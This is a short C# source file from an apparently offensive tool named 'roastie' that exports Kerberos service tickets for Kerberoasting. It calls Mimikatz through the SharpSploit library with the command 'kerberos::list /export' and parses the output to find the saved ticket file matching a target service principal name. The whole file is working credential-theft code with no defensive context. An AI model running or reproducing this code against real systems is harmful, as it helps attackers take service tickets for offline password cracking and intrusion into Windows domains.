using System;
using System.Collections.Generic;
using SharpSploit.Credentials;


namespace roastie
{
    class TicketExport
    {

        public static void ExportTickets(SPN spn)
        {
            string result = Mimikatz.Command("\"kerberos::list /export\"");
            Console.WriteLine("\t[#] Saved to file: {0}",ParseMimiOutput(result, spn).Split(':')[1]);

        }

        private static string ParseMimiOutput(string result, SPN spn)
        {
            string output = "Not Found";
            string[] lines = result.Split('\n');
            foreach(string line in lines)
            {
                if (line.Contains("Saved") && line.Contains(spn.host) && line.Contains(spn.service))
                {
                    output = line;
                }
            }
            return output.Trim();
        }
        
    }

}
